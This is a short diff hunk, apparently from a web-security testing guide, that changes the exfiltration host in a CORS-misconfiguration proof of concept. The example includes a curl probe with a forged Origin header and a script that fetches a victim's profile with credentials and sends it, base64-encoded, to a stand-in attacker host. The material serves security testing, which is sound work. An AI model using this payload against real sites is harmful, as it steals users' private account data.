@@ -129,7 +129,7 @@ curl -s -H 'Origin: https://evil-TARGET' 'https://TARGET/api/endpoint' -D-
 <script>
 fetch('https://TARGET/api/user/profile', { credentials: 'include' })
   .then(r => r.json())
-  .then(d => fetch('https://YOUR-COLLABORATOR.oast.fun/?data=' + btoa(JSON.stringify(d))));
+  .then(d => fetch('https://CANARY.attacker.example/?data=' + btoa(JSON.stringify(d))));
 </script>
 ```
 
